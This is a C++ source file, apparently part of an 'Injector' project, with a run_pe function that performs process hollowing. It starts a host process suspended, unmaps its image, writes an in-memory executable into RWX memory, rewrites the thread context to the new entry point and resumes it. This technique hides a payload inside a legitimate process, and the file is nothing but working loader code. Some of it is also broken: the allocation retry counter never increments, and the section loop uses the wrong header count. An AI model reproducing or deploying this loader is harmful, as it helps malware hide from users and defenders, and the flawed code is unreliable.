#include "Injector.h"

/****************************************************************
 *
 * Runs an application from in-memory byte array
 *
 ***************************************************************/
bool run_pe(byte_array exe, std::wstring hostProcess, std::wstring optionalArguments = L"")
{
	int error_code;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS nt_headers;

	// Copy DOS and NT headers
	memcpy(&dos_header, exe.pointer, sizeof(IMAGE_DOS_HEADER));
	memcpy(&nt_headers, exe.pointer + dos_header.e_lfanew, sizeof(IMAGE_NT_HEADERS));

	// Create process
	STARTUPINFO StartupInfo;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	//StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	//StartupInfo.wShowWindow = SW_SHOWDEFAULT;

	PROCESS_INFORMATION process_info;
	ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
	if (!CreateProcess((LPCWSTR)(hostProcess.c_str()), (LPWSTR)(optionalArguments.c_str()), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &process_info)){
		printf("Error during started host process, task terminated (code %d)\n", GetLastError());
		return false;
	}

	// Free old memory
	auto xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
	xNtUnmapViewOfSection(process_info.hProcess, (PVOID)nt_headers.OptionalHeader.ImageBase);

	// Allocating memory
	int alloc_attempts = 0;
	const int max_alloc_attempts = 1000;
	LPVOID alloc_result;
	do {
		alloc_result = VirtualAllocEx(process_info.hProcess, (void*)nt_headers.OptionalHeader.ImageBase, nt_headers.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	} while (alloc_result == NULL && alloc_attempts < max_alloc_attempts);
	if (alloc_attempts == max_alloc_attempts){
		printf("Cannot allocate memory, task terminated (code %d)\n", GetLastError());
		return false;
	}

	// Injecting headers
	bool write_result = WriteProcessMemory(process_info.hProcess, (void*)nt_headers.OptionalHeader.ImageBase, exe.pointer, nt_headers.OptionalHeader.SizeOfHeaders, NULL);
	if (write_result == false)
		printf("Error writing headers: (code %d)\n", GetLastError());

	// Injecting sections
	for (size_t i = 0; i < nt_headers.OptionalHeader.NumberOfRvaAndSizes; i++)
	{
		IMAGE_SECTION_HEADER section_header;
		memcpy(
			&section_header, 
			(exe.pointer + dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)), 
			sizeof(IMAGE_SECTION_HEADER));
		if (section_header.SizeOfRawData > 0 && section_header.SizeOfRawData < exe.size){
			write_result = WriteProcessMemory(process_info.hProcess, (void*)(nt_headers.OptionalHeader.ImageBase + section_header.VirtualAddress), exe.pointer + section_header.PointerToRawData, section_header.SizeOfRawData, NULL);
			if (write_result == false)
				printf("Error writing section %d: (code %d)\n", (i + 1), GetLastError());
		}
	}

	error_code = GetLastError();
	
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;

	// Get thread's context
 	bool get_ctx_result = GetThreadContext(process_info.hThread, &ctx);
	if (get_ctx_result == false)
		printf("Error getting thread's context (code %d)\n", GetLastError());

	// Setting new ImageBase
	DWORD *pebInfo = (DWORD *)ctx.Ebx;
	
	write_result = WriteProcessMemory(process_info.hProcess, &pebInfo[2], &nt_headers.OptionalHeader.ImageBase, sizeof(DWORD), NULL);
	if (write_result == false)
		printf("Error writing image base (code %d)\n", GetLastError());

	// EAX contains pointer to the entry point
	ctx.Eax = (DWORD)(nt_headers.OptionalHeader.ImageBase + nt_headers.OptionalHeader.AddressOfEntryPoint);

	// Set thread context and resume program
	bool set_ctx_result = SetThreadContext(process_info.hThread, &ctx);
	if (set_ctx_result == false)
		printf("Error setting thread's context (code %d)\n", GetLastError());

	ResumeThread(process_info.hThread);

	return true;
}
